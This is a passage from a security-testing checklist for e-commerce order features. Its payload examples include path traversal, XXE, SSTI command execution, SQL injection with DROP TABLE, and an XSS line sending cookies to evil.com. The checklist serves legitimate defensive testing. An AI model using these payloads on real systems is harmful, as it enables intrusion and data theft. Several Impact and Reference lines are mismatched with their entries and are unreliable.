**Test Steps:** 1. Attempt to reorder items that are now discontinued or out of stock. 2. Check if the reorder processes successfully despite unavailability.

**Expected Result:** Application must validate item availability during reorder and inform the user if items are unavailable.

**Payload Example:**

```
POST /api/orders/reorder for order containing discontinued item_id
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-078 — Reorder with Expired Payment Method
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Reorder / Buy Again

**Test Steps:** 1. Reorder using a previously stored but now expired or invalid payment method. 2. Check if payment is attempted on the invalid method or if proper validation occurs.

**Expected Result:** Application must validate payment method validity during reorder and prompt for updated payment if method is expired.

**Payload Example:**

```
POST /api/orders/reorder with payment_method_id pointing to expired card
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-079 — Coupon Code Replay on Reorder
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Reorder / Buy Again

**Test Steps:** 1. Reorder an item that originally had a promotional discount. 2. Check if the expired or used coupon is automatically reapplied. 3. Attempt to inject old coupon code.

**Expected Result:** Application must validate coupon eligibility at the time of reorder and not automatically reapply expired promotions.

**Payload Example:**

```
POST /api/orders/reorder with original coupon_code=EXPIRED50 in the request
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ORD-080 — Authentication Bypass on Reorder API
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Reorder / Buy Again

**Test Steps:** 1. Capture reorder API request. 2. Remove authentication token. 3. Submit the request. 4. Check if reorder processes without authentication.

**Expected Result:** Application must require valid authentication for all reorder operations.

**Payload Example:**

```
Remove Authorization header from POST /api/orders/reorder
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite;Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ORD-081 — Mass Reorder Abuse for Inventory Depletion
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Reorder / Buy Again

**Test Steps:** 1. Script automated reorder requests for limited-stock items. 2. Send many concurrent reorder requests. 3. Check if inventory is depleted maliciously.

**Expected Result:** Application must implement rate limiting on reorder and validate stock before processing each request.

**Payload Example:**

```
Send 100 concurrent POST /api/orders/reorder for limited-stock item
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Turbo Intruder;Custom Scripts

**References:** CWE-840; PortSwigger Business logic

---

## ORD-082 — IDOR on Invoice Download
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Invoice / Receipt

**Test Steps:** 1. Download invoice for own order. 2. Intercept the request and change invoice_id or order_id to another user's. 3. Check if another user's invoice is downloaded.

**Expected Result:** Application must verify order ownership before serving invoices and only allow download of own invoices.

**Payload Example:**

```
Change GET /api/invoices/INV-1001 to INV-1002 or GET /api/orders/1002/invoice
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-083 — Path Traversal in Invoice Download
**Test Category:** Path Traversal (WSTG-INPV-10) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Invoice / Receipt

**Test Steps:** 1. Download an invoice and intercept the request. 2. Modify the file path parameter to traverse directories. 3. Attempt to read arbitrary server files.

**Expected Result:** Application must validate file paths strictly and prevent directory traversal in invoice download functionality.

**Payload Example:**

```
GET /api/invoices/download?file=../../../etc/passwd or file=..%2F..%2F..%2Fetc%2Fpasswd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite;Postman

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## ORD-084 — Invoice Enumeration and Mass Download
**Test Category:** Information Disclosure (WSTG-INFO-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Invoice / Receipt

**Test Steps:** 1. Note the invoice numbering pattern. 2. Enumerate sequential invoice IDs. 3. Attempt to download all invoices in range.

**Expected Result:** Application must use non-sequential unpredictable invoice IDs and enforce authorization on each download.

**Payload Example:**

```
Enumerate GET /api/invoices/INV-00001 through INV-99999
```

**Impact:** Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO.

**Tools:** Burp Suite Intruder;ffuf

**References:** CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04

---

## ORD-085 — XSS in Invoice PDF Generation
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Order Invoice / Receipt

**Test Steps:** 1. Place an order with XSS payloads in name or address fields. 2. Generate the invoice PDF. 3. Check if XSS payload is rendered in the PDF viewer or HTML invoice.

**Expected Result:** Application must sanitize all dynamic content before including it in invoice generation templates.

**Payload Example:**

```
billing_name=<script>alert('XSS')</script> or address=<iframe src=javascript:alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;Browser

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ORD-086 — Server-Side Template Injection in Invoice
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Invoice / Receipt

**Test Steps:** 1. Place an order with SSTI payloads in name or address fields. 2. Generate invoice. 3. Check if the template engine processes the payload.

**Expected Result:** Application must escape template syntax in user-provided data before rendering invoices.

**Payload Example:**

```
customer_name={{7*7}} or address=${7*7} or address=<%= system('id') %>
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## ORD-087 — Invoice Tampering for Fraud
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Invoice / Receipt

**Test Steps:** 1. Download an invoice. 2. Check if any invoice data can be modified via API. 3. Attempt to change invoice amounts or details by intercepting invoice generation request.

**Expected Result:** Application must generate invoices from server-side order data only and not allow client-side manipulation of invoice content.

**Payload Example:**

```
Modify invoice_total or tax_amount in invoice generation request body
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-088 — Sensitive Data Exposure in Invoice
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Order Invoice / Receipt

**Test Steps:** 1. Download an invoice and review its content. 2. Check for exposure of full payment card numbers or internal system IDs or seller personal details.

**Expected Result:** Invoice must only contain necessary business information with masked payment details.

**Payload Example:**

```
Review PDF for full card numbers; internal IDs; employee details; system information
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Manual Review;Burp Suite

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ORD-089 — Unauthenticated Invoice Access via Direct URL
**Test Category:** Authentication (WSTG-ATHN-01) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Invoice / Receipt

**Test Steps:** 1. Copy the direct URL of an invoice download. 2. Open it in an incognito browser without logging in. 3. Check if the invoice is accessible without authentication.

**Expected Result:** Application must require authentication for all invoice access and not serve invoices via publicly accessible URLs.

**Payload Example:**

```
Access GET /api/invoices/download/INV-1001.pdf without any session or token
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Browser;Burp Suite

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## ORD-090 — XXE in Invoice XML Processing
**Test Category:** Injection (WSTG-INPV-07) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Invoice / Receipt

**Test Steps:** 1. If invoice generation involves XML processing intercept and inject XXE payload. 2. Submit and check if external entities are resolved.

**Expected Result:** Application must disable external entity resolution in all XML parsers used for invoice generation.

**Payload Example:**

```
<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><invoice><name>&xxe;</name></invoice>
```

**Impact:** XXE -&gt; local file read / SSRF / OOB exfiltration.

**Tools:** Burp Suite;OWASP ZAP

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE

---

## ORD-091 — IDOR on Delivery Schedule Modification
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Delivery Scheduling

**Test Steps:** 1. Schedule a delivery for own order. 2. Intercept the request and change order_id to another user's order. 3. Modify the delivery schedule for another user.

**Expected Result:** Application must verify order ownership before allowing delivery schedule changes.

**Payload Example:**

```
Change PUT /api/orders/1001/delivery-schedule to /api/orders/1002/delivery-schedule
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-092 — Past Date Delivery Scheduling
**Test Category:** Input Validation (WSTG-INPV-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Delivery Scheduling

**Test Steps:** 1. Schedule a delivery and intercept the request. 2. Set the delivery_date to a past date. 3. Submit and check if the past date is accepted.

**Expected Result:** Application must validate that delivery dates are in the future and within acceptable range.

**Payload Example:**

```
delivery_date=2020-01-01 or delivery_date=1970-01-01
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite;Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## ORD-093 — Scheduling Delivery to Restricted Areas
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Delivery Scheduling

**Test Steps:** 1. Schedule delivery and intercept request. 2. Modify the delivery address or zone to a restricted or non-serviceable area. 3. Check if scheduling accepts it.

**Expected Result:** Application must validate delivery zones and addresses server-side and reject unserviceable locations.

**Payload Example:**

```
Change delivery_zone=serviceable_area to delivery_zone=restricted_area or delivery_zip=00000
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-094 — SQL Injection in Delivery Address Fields
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Delivery Scheduling

**Test Steps:** 1. Enter delivery scheduling information. 2. Inject SQL payloads in address or time slot fields. 3. Submit and observe response.

**Expected Result:** Application must use parameterized queries for all delivery scheduling database operations.

**Payload Example:**

```
delivery_address=123 Main St' OR 1=1--; time_slot=morning'; DROP TABLE deliveries;--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-095 — Race Condition on Limited Delivery Slots
**Test Category:** Business Logic (WSTG-BUSL-08) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Delivery Scheduling

**Test Steps:** 1. Identify a delivery time slot with limited availability. 2. Send multiple concurrent scheduling requests for the same slot. 3. Check if overbooking occurs.

**Expected Result:** Application must implement proper concurrency control to prevent overbooking of delivery time slots.

**Payload Example:**

```
Send 50 concurrent POST /api/delivery/schedule requests for the same time_slot_id
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder;Burp Suite

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## ORD-096 — Unauthorized Delivery Schedule Cancellation
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Delivery Scheduling

**Test Steps:** 1. As User A attempt to cancel User B's scheduled delivery. 2. Use User B's delivery_schedule_id with User A's auth. 3. Check if cancellation succeeds.

**Expected Result:** Application must enforce ownership checks before allowing cancellation of scheduled deliveries.

**Payload Example:**

```
DELETE /api/delivery/schedule/DS-1002 with User A's authentication
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-097 — Delivery Date Manipulation for Free Shipping
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Delivery Scheduling

**Test Steps:** 1. Schedule delivery and check if specific dates have free shipping. 2. Intercept request and modify date to free shipping eligible date. 3. Check if discount applies.

**Expected Result:** Application must validate delivery date eligibility for promotions server-side and not trust client-provided dates.

**Payload Example:**

```
Change delivery_date to a promotional date; modify shipping_cost=0.00
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-098 — XSS in Delivery Instructions
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Delivery Scheduling

**Test Steps:** 1. Enter delivery scheduling with XSS payload in delivery instructions. 2. Submit the schedule. 3. Check if payload executes when driver or admin views instructions.

**Expected Result:** Application must sanitize all delivery instruction inputs and encode output to prevent stored XSS.

**Payload Example:**

```
delivery_instructions=<script>fetch('https://evil.com/?c='+document.cookie)</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ORD-099 — Stored XSS in Order Notes
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Order Notes / Instructions

**Test Steps:** 1. Place an order with XSS payload in order notes or special instructions. 2. View the order in admin panel or customer order details. 3. Check if script executes.

**Expected Result:** Application must sanitize and encode all order notes content before rendering in any context.

**Payload Example:**

```
order_notes=<svg/onload=alert('XSS')> or special_instructions=<img src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ORD-100 — SQL Injection in Order Notes
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Notes / Instructions

**Test Steps:** 1. Place an order and inject SQL payloads in the order notes field. 2. Submit and observe the response for SQL errors or data leakage.

**Expected Result:** Application must use parameterized queries for storing and retrieving order notes.

**Payload Example:**

```
order_notes=Please deliver fast' UNION SELECT password FROM users WHERE '1'='1
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-101 — IDOR on Order Notes Access
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Notes / Instructions

**Test Steps:** 1. Access order notes for own order. 2. Change order_id parameter to another user's order. 3. Check if other user's notes are accessible.

**Expected Result:** Application must verify order ownership before displaying order notes.

**Payload Example:**

```
GET /api/orders/1002/notes using User A's session
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-102 — SSTI in Order Notes Rendering
**Test Category:** Injection (WSTG-INPV-18) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Order Notes / Instructions

**Test Steps:** 1. Add SSTI payloads in order notes field. 2. Submit the order. 3. Check if the template engine evaluates the expression when notes are rendered.

**Expected Result:** Application must treat order notes as plain text and not process template syntax within them.

**Payload Example:**

```
order_notes={{config}} or order_notes=${T(java.lang.Runtime).getRuntime().exec('id')}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite;Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## ORD-103 — Excessive Data in Order Notes for DoS
**Test Category:** Business Logic (WSTG-BUSL-05) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Notes / Instructions

**Test Steps:** 1. Submit order notes with an extremely large text payload. 2. Check if the server accepts it without length validation. 3. Observe impact on performance.

**Expected Result:** Application must enforce reasonable length limits on order notes to prevent storage and processing abuse.

**Payload Example:**

```
order_notes=[1MB+ of text data] or order_notes=A*1000000
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## ORD-104 — HTML Injection in Order Notes
**Test Category:** Injection (WSTG-INPV-03) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Notes / Instructions

**Test Steps:** 1. Add HTML tags in order notes to modify page layout. 2. Submit and view the notes in different contexts. 3. Check for content injection.

**Expected Result:** Application must sanitize HTML in order notes and render only plain text.

**Payload Example:**

```
order_notes=<h1>URGENT: Order Cancelled</h1><a href='https://evil.com'>Click here for refund</a>
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite;Browser

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-105 — CRLF Injection in Order Notes
**Test Category:** Injection (WSTG-INPV-15) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Order Notes / Instructions

**Test Steps:** 1. Inject CRLF characters in order notes. 2. Check if headers are injected when notes are included in responses or emails.

**Expected Result:** Application must strip or encode CRLF characters in all order note inputs.

**Payload Example:**

```
order_notes=Note%0d%0aSet-Cookie:session=evil or order_notes=test%0d%0aX-Injected:true
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite;Custom Scripts

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## ORD-106 — Price Manipulation on Gift Wrapping
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Gift Wrapping Options

**Test Steps:** 1. Select gift wrapping option during order. 2. Intercept the request and modify gift_wrap_price to 0 or negative. 3. Submit and check if free or credited gift wrapping is applied.

**Expected Result:** Application must use server-defined prices for gift wrapping and not accept client-provided pricing.

**Payload Example:**

```
Change gift_wrap_price=5.99 to gift_wrap_price=0.00 or gift_wrap_price=-5.99
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-107 — XSS in Gift Message
**Test Category:** Cross-Site Scripting (WSTG-INPV-02) · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Gift Wrapping Options

**Test Steps:** 1. Select gift wrapping and add a gift message. 2. Insert XSS payload in the gift_message field. 3. Check if it executes when the recipient or admin views the message.

**Expected Result:** Application must sanitize and encode gift messages before rendering to any user.

**Payload Example:**

```
gift_message=<script>alert(document.cookie)</script> or gift_message=<img/src=x onerror=alert(1)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite;XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## ORD-108 — Gift Wrapping Without Paying
**Test Category:** Business Logic (WSTG-BUSL-01) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Gift Wrapping Options

**Test Steps:** 1. Add gift wrapping to order. 2. Intercept the final order request. 3. Remove the gift wrapping cost from the total but keep the gift_wrap=true flag. 4. Check if wrapping is applied without charge.

**Expected Result:** Application must recalculate total server-side including gift wrapping cost when the option is selected.

**Payload Example:**

```
Set gift_wrap=true but remove gift_wrap_cost from total calculation in request
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-109 — SQL Injection in Gift Message
**Test Category:** Injection (WSTG-INPV-05) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Gift Wrapping Options

**Test Steps:** 1. Add gift wrapping with a gift message. 2. Inject SQL payload in the gift_message field. 3. Submit and observe the response.

**Expected Result:** Application must use parameterized queries for storing gift messages.

**Payload Example:**

```
gift_message=Happy Birthday' OR 1=1; DROP TABLE orders;--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap;Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## ORD-110 — IDOR on Gift Wrapping Configuration
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Gift Wrapping Options

**Test Steps:** 1. Apply gift wrapping to own order. 2. Change order_id to another user's order. 3. Check if gift wrapping is applied to another user's order.

**Expected Result:** Application must verify order ownership before allowing gift wrapping modifications.

**Payload Example:**

```
PUT /api/orders/1002/gift-wrap with User A's session
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-111 — Bypassing Gift Wrapping Availability Rules
**Test Category:** Business Logic (WSTG-BUSL-02) · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Gift Wrapping Options

**Test Steps:** 1. Check if certain items are not eligible for gift wrapping. 2. Force gift_wrap=true for ineligible items via API. 3. Check if it is accepted.

**Expected Result:** Application must validate gift wrapping eligibility server-side based on item type and rules.

**Payload Example:**

```
POST /api/orders with gift_wrap=true for item marked as non-wrappable
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite;Postman

**References:** CWE-840; PortSwigger Business logic

---

## ORD-112 — IDOR Accessing Other Vendor's Order Details
**Test Category:** Broken Access Control (WSTG-AUTHZ-04) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multi-Vendor Orders

**Test Steps:** 1. Login as Vendor A. 2. Access order details for an order assigned to Vendor B by changing vendor_id or order_id. 3. Check if Vendor B's order details are visible.

**Expected Result:** Application must isolate vendor access to only their own orders within multi-vendor architecture.

**Payload Example:**

```
Change GET /api/vendor/orders?vendor_id=V001 to vendor_id=V002
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-113 — Vendor Impersonation on Order Fulfillment
**Test Category:** Broken Access Control (WSTG-AUTHZ-02) · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Multi-Vendor Orders

**Test Steps:** 1. As Vendor A attempt to mark Vendor B's order items as shipped or fulfilled. 2. Intercept and modify vendor_id or item_id. 3. Check if the action succeeds.

**Expected Result:** Application must verify that the vendor owns the order items before allowing fulfillment actions.

**Payload Example:**

```
POST /api/vendor/orders/fulfill with Vendor B's order_item_id using Vendor A's credentials
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite;Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## ORD-114 — Cross-Vendor Data Leakage in API Response
**Test Category:** Information Disclosure (WSTG-INFO-05) · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Multi-Vendor Orders

**Test Steps:** 1. As a vendor fetch order details via API. 2. Inspect the response for data belonging to other vendors on the same order. 3. Check for customer data shared across vendors.

**Expected Result:** API must only return vendor-specific data for multi-vendor orders and not expose other vendors' information.

**Payload Example:**

```
Inspect response for other_vendor_name; other_vendor_commission; cross_vendor_customer_data
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite;Postman

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## ORD-115 — Commission Manipulation by Vendor
